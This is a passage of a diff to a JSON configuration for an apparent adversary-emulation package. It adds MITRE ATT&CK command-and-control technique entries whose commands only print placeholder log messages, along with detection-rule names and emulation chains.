+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1102.003-One-Way Communication",
+      "name": "Excalibur - Command and Control-T1102.003-One-Way Communication",
+      "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel.",
+      "tactic": "Command and Control",
+      "tcode": "T1102.003",
+      "technique_name": "One-Way Communication",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1102.003 - One-Way Communication'; Write-Host '[INFO] Emulating T1102.003 (One-Way Communication) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1102.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1102.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect One-Way Communication (T1102.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1090.003-Multi-hop Proxy",
+      "name": "Excalibur - Command and Control-T1090.003-Multi-hop Proxy",
+      "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1090.003",
+      "technique_name": "Multi-hop Proxy",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1090.003 - Multi-hop Proxy'; Write-Host '[INFO] Emulating T1090.003 (Multi-hop Proxy) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1090.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1090.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Multi-hop Proxy (T1090.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1219.003-Remote Access Hardware",
+      "name": "Excalibur - Command and Control-T1219.003-Remote Access Hardware",
+      "description": "An adversary may use legitimate remote access hardware to establish an interactive command and control channel to target systems within networks.",
+      "tactic": "Command and Control",
+      "tcode": "T1219.003",
+      "technique_name": "Remote Access Hardware",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1219.003 - Remote Access Hardware'; Write-Host '[INFO] Emulating T1219.003 (Remote Access Hardware) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1219.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1219.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Remote Access Hardware (T1219.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1571-Non-Standard Port",
+      "name": "Excalibur - Command and Control-T1571-Non-Standard Port",
+      "description": "Adversaries may communicate using a protocol and port pairing that are typically not associated.",
+      "tactic": "Command and Control",
+      "tcode": "T1571",
+      "technique_name": "Non-Standard Port",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1571 - Non-Standard Port'; Write-Host '[INFO] Emulating T1571 (Non-Standard Port) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1571 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1571 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Non-Standard Port (T1571)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1102.002-Bidirectional Communication",
+      "name": "Excalibur - Command and Control-T1102.002-Bidirectional Communication",
+      "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel.",
+      "tactic": "Command and Control",
+      "tcode": "T1102.002",
+      "technique_name": "Bidirectional Communication",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1102.002 - Bidirectional Communication'; Write-Host '[INFO] Emulating T1102.002 (Bidirectional Communication) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1102.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1102.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Bidirectional Communication (T1102.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1573.002-Asymmetric Cryptography",
+      "name": "Excalibur - Command and Control-T1573.002-Asymmetric Cryptography",
+      "description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.",
+      "tactic": "Command and Control",
+      "tcode": "T1573.002",
+      "technique_name": "Asymmetric Cryptography",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1573.002 - Asymmetric Cryptography'; Write-Host '[INFO] Emulating T1573.002 (Asymmetric Cryptography) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1573.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1573.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Asymmetric Cryptography (T1573.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1001.003-Protocol or Service Impersonation",
+      "name": "Excalibur - Command and Control-T1001.003-Protocol or Service Impersonation",
+      "description": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts.",
+      "tactic": "Command and Control",
+      "tcode": "T1001.003",
+      "technique_name": "Protocol or Service Impersonation",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1001.003 - Protocol or Service Impersonation'; Write-Host '[INFO] Emulating T1001.003 (Protocol or Service Impersonation) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1001.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1001.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Protocol or Service Impersonation (T1001.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1090.004-Domain Fronting",
+      "name": "Excalibur - Command and Control-T1090.004-Domain Fronting",
+      "description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.",
+      "tactic": "Command and Control",
+      "tcode": "T1090.004",
+      "technique_name": "Domain Fronting",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1090.004 - Domain Fronting'; Write-Host '[INFO] Emulating T1090.004 (Domain Fronting) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1090.004 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1090.004 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Domain Fronting (T1090.004)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1132-Data Encoding",
+      "name": "Excalibur - Command and Control-T1132-Data Encoding",
+      "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect.",
+      "tactic": "Command and Control",
+      "tcode": "T1132",
+      "technique_name": "Data Encoding",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1132 - Data Encoding'; Write-Host '[INFO] Emulating T1132 (Data Encoding) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1132 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1132 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Data Encoding (T1132)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1219.002-Remote Desktop Software",
+      "name": "Excalibur - Command and Control-T1219.002-Remote Desktop Software",
+      "description": "An adversary may use legitimate desktop support software to establish an interactive command and control channel to target systems within networks.",
+      "tactic": "Command and Control",
+      "tcode": "T1219.002",
+      "technique_name": "Remote Desktop Software",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1219.002 - Remote Desktop Software'; Write-Host '[INFO] Emulating T1219.002 (Remote Desktop Software) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1219.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1219.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Remote Desktop Software (T1219.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1132.002-Non-Standard Encoding",
+      "name": "Excalibur - Command and Control-T1132.002-Non-Standard Encoding",
+      "description": "Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.",
+      "tactic": "Command and Control",
+      "tcode": "T1132.002",
+      "technique_name": "Non-Standard Encoding",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1132.002 - Non-Standard Encoding'; Write-Host '[INFO] Emulating T1132.002 (Non-Standard Encoding) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1132.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1132.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Non-Standard Encoding (T1132.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1071.001-Web Protocols",
+      "name": "Excalibur - Command and Control-T1071.001-Web Protocols",
+      "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.",
+      "tactic": "Command and Control",
+      "tcode": "T1071.001",
+      "technique_name": "Web Protocols",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1071.001 - Web Protocols'; Write-Host '[INFO] Emulating T1071.001 (Web Protocols) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1071.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1071.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Web Protocols (T1071.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1105-Ingress Tool Transfer",
+      "name": "Excalibur - Command and Control-T1105-Ingress Tool Transfer",
+      "description": "Adversaries may transfer tools or other files from an external system into a compromised environment.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1105 - Ingress Tool Transfer'; Write-Host '[INFO] Emulating T1105 (Ingress Tool Transfer) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1105 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1105 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Ingress Tool Transfer (T1105)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1665-Hide Infrastructure",
+      "name": "Excalibur - Command and Control-T1665-Hide Infrastructure",
+      "description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure.",
+      "tactic": "Command and Control",
+      "tcode": "T1665",
+      "technique_name": "Hide Infrastructure",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1665 - Hide Infrastructure'; Write-Host '[INFO] Emulating T1665 (Hide Infrastructure) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1665 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1665 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Hide Infrastructure (T1665)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1001.002-Steganography",
+      "name": "Excalibur - Command and Control-T1001.002-Steganography",
+      "description": "Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult.",
+      "tactic": "Command and Control",
+      "tcode": "T1001.002",
+      "technique_name": "Steganography",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1001.002 - Steganography'; Write-Host '[INFO] Emulating T1001.002 (Steganography) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1001.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1001.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Steganography (T1001.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1008-Fallback Channels",
+      "name": "Excalibur - Command and Control-T1008-Fallback Channels",
+      "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
+      "tactic": "Command and Control",
+      "tcode": "T1008",
+      "technique_name": "Fallback Channels",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1008 - Fallback Channels'; Write-Host '[INFO] Emulating T1008 (Fallback Channels) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1008 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1008 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Fallback Channels (T1008)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1090.001-Internal Proxy",
+      "name": "Excalibur - Command and Control-T1090.001-Internal Proxy",
+      "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment.",
+      "tactic": "Command and Control",
+      "tcode": "T1090.001",
+      "technique_name": "Internal Proxy",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1090.001 - Internal Proxy'; Write-Host '[INFO] Emulating T1090.001 (Internal Proxy) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1090.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1090.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Internal Proxy (T1090.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1102.001-Dead Drop Resolver",
+      "name": "Excalibur - Command and Control-T1102.001-Dead Drop Resolver",
+      "description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure.",
+      "tactic": "Command and Control",
+      "tcode": "T1102.001",
+      "technique_name": "Dead Drop Resolver",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1102.001 - Dead Drop Resolver'; Write-Host '[INFO] Emulating T1102.001 (Dead Drop Resolver) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1102.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1102.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Dead Drop Resolver (T1102.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Command and Control-T1001.001-Junk Data",
+      "name": "Excalibur - Command and Control-T1001.001-Junk Data",
+      "description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.",
+      "tactic": "Command and Control",
+      "tcode": "T1001.001",
+      "technique_name": "Junk Data",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1001.001 - Junk Data'; Write-Host '[INFO] Emulating T1001.001 (Junk Data) tactic=Command and Control platform=windows'; Write-Host '[SUCCESS] T1001.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1001.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Junk Data (T1001.001)",
       "sentinel_connector": "Microsoft Defender for Endpoint",
       "package": "excalibur"
     }
@@ -277,7 +874,9 @@
       "package": "excalibur",
       "tcode": "T1071",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1071-HTTP Beacon Pattern"]
+      "script_refs": [
+        "Excalibur - C2-T1071-HTTP Beacon Pattern"
+      ]
     },
     {
       "name": "Excalibur - C2-T1071-DNS Tunneling Simulation",
@@ -285,7 +884,9 @@
       "package": "excalibur",
       "tcode": "T1071",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1071-DNS Tunneling Simulation"]
+      "script_refs": [
+        "Excalibur - C2-T1071-DNS Tunneling Simulation"
+      ]
     },
     {
       "name": "Excalibur - C2-T1573-Encrypted Channel",
@@ -293,7 +894,9 @@
       "package": "excalibur",
       "tcode": "T1573",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1573-Encrypted Channel"]
+      "script_refs": [
+        "Excalibur - C2-T1573-Encrypted Channel"
+      ]
     },
     {
       "name": "Excalibur - C2-T1095-Non-Standard Port",
@@ -301,7 +904,9 @@
       "package": "excalibur",
       "tcode": "T1095",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1095-Non-Standard Port"]
+      "script_refs": [
+        "Excalibur - C2-T1095-Non-Standard Port"
+      ]
     },
     {
       "name": "Excalibur - C2-T1572-Protocol Tunneling",
@@ -309,7 +914,9 @@
       "package": "excalibur",
       "tcode": "T1572",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1572-Protocol Tunneling"]
+      "script_refs": [
+        "Excalibur - C2-T1572-Protocol Tunneling"
+      ]
     },
     {
       "name": "Excalibur - C2-T1568-Dynamic Resolution",
@@ -317,7 +924,9 @@
       "package": "excalibur",
       "tcode": "T1568",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1568-Dynamic Resolution"]
+      "script_refs": [
+        "Excalibur - C2-T1568-Dynamic Resolution"
+      ]
     },
     {
       "name": "Excalibur - C2-T1102-Web Service C2",
@@ -325,7 +934,9 @@
       "package": "excalibur",
       "tcode": "T1102",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1102-Web Service C2"]
+      "script_refs": [
+        "Excalibur - C2-T1102-Web Service C2"
+      ]
     },
     {
       "name": "Excalibur - C2-T1001-Data Obfuscation",
@@ -333,7 +944,9 @@
       "package": "excalibur",
       "tcode": "T1001",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1001-Data Obfuscation"]
+      "script_refs": [
+        "Excalibur - C2-T1001-Data Obfuscation"
+      ]
     },
     {
       "name": "Excalibur - C2-T1219-Remote Access Software",
@@ -341,7 +954,9 @@
       "package": "excalibur",
       "tcode": "T1219",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1219-Remote Access Software"]
+      "script_refs": [
+        "Excalibur - C2-T1219-Remote Access Software"
+      ]
     },
     {
       "name": "Excalibur - C2-T1090-Proxy",
@@ -349,7 +964,9 @@
       "package": "excalibur",
       "tcode": "T1090",
       "tactic": "Command and Control",
-      "script_refs": ["Excalibur - C2-T1090-Proxy"]
+      "script_refs": [
+        "Excalibur - C2-T1090-Proxy"
+      ]
     },
     {
       "name": "Excalibur - C2 Full Sweep",
@@ -368,6 +985,366 @@
         "Excalibur - C2-T1001-Data Obfuscation",
         "Excalibur - C2-T1219-Remote Access Software",
         "Excalibur - C2-T1090-Proxy"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1205.002-Socket Filters",
+      "description": "Emulation chain for T1205.002: Socket Filters.",
+      "package": "excalibur",
+      "tcode": "T1205.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1205.002-Socket Filters"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1132.001-Standard Encoding",
+      "description": "Emulation chain for T1132.001: Standard Encoding.",
+      "package": "excalibur",
+      "tcode": "T1132.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1132.001-Standard Encoding"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1568.002-Domain Generation Algorithms",
+      "description": "Emulation chain for T1568.002: Domain Generation Algorithms.",
+      "package": "excalibur",
+      "tcode": "T1568.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1568.002-Domain Generation Algorithms"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1071.004-DNS",
+      "description": "Emulation chain for T1071.004: DNS.",
+      "package": "excalibur",
+      "tcode": "T1071.004",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1071.004-DNS"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1071.005-Publish/Subscribe Protocols",
+      "description": "Emulation chain for T1071.005: Publish/Subscribe Protocols.",
+      "package": "excalibur",
+      "tcode": "T1071.005",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1071.005-Publish/Subscribe Protocols"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1573.001-Symmetric Cryptography",
+      "description": "Emulation chain for T1573.001: Symmetric Cryptography.",
+      "package": "excalibur",
+      "tcode": "T1573.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1573.001-Symmetric Cryptography"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1568.001-Fast Flux DNS",
+      "description": "Emulation chain for T1568.001: Fast Flux DNS.",
+      "package": "excalibur",
+      "tcode": "T1568.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1568.001-Fast Flux DNS"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1659-Content Injection",
+      "description": "Emulation chain for T1659: Content Injection.",
+      "package": "excalibur",
+      "tcode": "T1659",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1659-Content Injection"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1205-Traffic Signaling",
+      "description": "Emulation chain for T1205: Traffic Signaling.",
+      "package": "excalibur",
+      "tcode": "T1205",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1205-Traffic Signaling"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1071.003-Mail Protocols",
+      "description": "Emulation chain for T1071.003: Mail Protocols.",
+      "package": "excalibur",
+      "tcode": "T1071.003",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1071.003-Mail Protocols"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1092-Communication Through Removable Media",
+      "description": "Emulation chain for T1092: Communication Through Removable Media.",
+      "package": "excalibur",
+      "tcode": "T1092",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1092-Communication Through Removable Media"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1090.002-External Proxy",
+      "description": "Emulation chain for T1090.002: External Proxy.",
+      "package": "excalibur",
+      "tcode": "T1090.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1090.002-External Proxy"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1219.001-IDE Tunneling",
+      "description": "Emulation chain for T1219.001: IDE Tunneling.",
+      "package": "excalibur",
+      "tcode": "T1219.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1219.001-IDE Tunneling"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1568.003-DNS Calculation",
+      "description": "Emulation chain for T1568.003: DNS Calculation.",
+      "package": "excalibur",
+      "tcode": "T1568.003",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1568.003-DNS Calculation"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1104-Multi-Stage Channels",
+      "description": "Emulation chain for T1104: Multi-Stage Channels.",
+      "package": "excalibur",
+      "tcode": "T1104",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1104-Multi-Stage Channels"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1205.001-Port Knocking",
+      "description": "Emulation chain for T1205.001: Port Knocking.",
+      "package": "excalibur",
+      "tcode": "T1205.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1205.001-Port Knocking"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1071.002-File Transfer Protocols",
+      "description": "Emulation chain for T1071.002: File Transfer Protocols.",
+      "package": "excalibur",
+      "tcode": "T1071.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1071.002-File Transfer Protocols"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1102.003-One-Way Communication",
+      "description": "Emulation chain for T1102.003: One-Way Communication.",
+      "package": "excalibur",
+      "tcode": "T1102.003",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1102.003-One-Way Communication"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1090.003-Multi-hop Proxy",
+      "description": "Emulation chain for T1090.003: Multi-hop Proxy.",
+      "package": "excalibur",
+      "tcode": "T1090.003",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1090.003-Multi-hop Proxy"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1219.003-Remote Access Hardware",
+      "description": "Emulation chain for T1219.003: Remote Access Hardware.",
+      "package": "excalibur",
+      "tcode": "T1219.003",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1219.003-Remote Access Hardware"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1571-Non-Standard Port",
+      "description": "Emulation chain for T1571: Non-Standard Port.",
+      "package": "excalibur",
+      "tcode": "T1571",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1571-Non-Standard Port"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1102.002-Bidirectional Communication",
+      "description": "Emulation chain for T1102.002: Bidirectional Communication.",
+      "package": "excalibur",
+      "tcode": "T1102.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1102.002-Bidirectional Communication"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1573.002-Asymmetric Cryptography",
+      "description": "Emulation chain for T1573.002: Asymmetric Cryptography.",
+      "package": "excalibur",
+      "tcode": "T1573.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1573.002-Asymmetric Cryptography"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1001.003-Protocol or Service Impersonation",
+      "description": "Emulation chain for T1001.003: Protocol or Service Impersonation.",
+      "package": "excalibur",
+      "tcode": "T1001.003",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1001.003-Protocol or Service Impersonation"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1090.004-Domain Fronting",
+      "description": "Emulation chain for T1090.004: Domain Fronting.",
+      "package": "excalibur",
+      "tcode": "T1090.004",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1090.004-Domain Fronting"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1132-Data Encoding",
+      "description": "Emulation chain for T1132: Data Encoding.",
+      "package": "excalibur",
+      "tcode": "T1132",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1132-Data Encoding"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1219.002-Remote Desktop Software",
+      "description": "Emulation chain for T1219.002: Remote Desktop Software.",
+      "package": "excalibur",
+      "tcode": "T1219.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1219.002-Remote Desktop Software"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1132.002-Non-Standard Encoding",
+      "description": "Emulation chain for T1132.002: Non-Standard Encoding.",
+      "package": "excalibur",
+      "tcode": "T1132.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1132.002-Non-Standard Encoding"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1071.001-Web Protocols",
+      "description": "Emulation chain for T1071.001: Web Protocols.",
+      "package": "excalibur",
+      "tcode": "T1071.001",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1071.001-Web Protocols"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1105-Ingress Tool Transfer",
+      "description": "Emulation chain for T1105: Ingress Tool Transfer.",
+      "package": "excalibur",
+      "tcode": "T1105",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1105-Ingress Tool Transfer"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1665-Hide Infrastructure",
+      "description": "Emulation chain for T1665: Hide Infrastructure.",
+      "package": "excalibur",
+      "tcode": "T1665",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1665-Hide Infrastructure"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1001.002-Steganography",
+      "description": "Emulation chain for T1001.002: Steganography.",
+      "package": "excalibur",
+      "tcode": "T1001.002",
+      "tactic": "Command and Control",
+      "script_refs": [
+        "Excalibur - Command and Control-T1001.002-Steganography"
+      ]
+    },
+    {
+      "name": "Excalibur - Command and Control-T1008-Fallback Channels",
+      "description": "Emulation chain for T1008: Fallback Channels.",
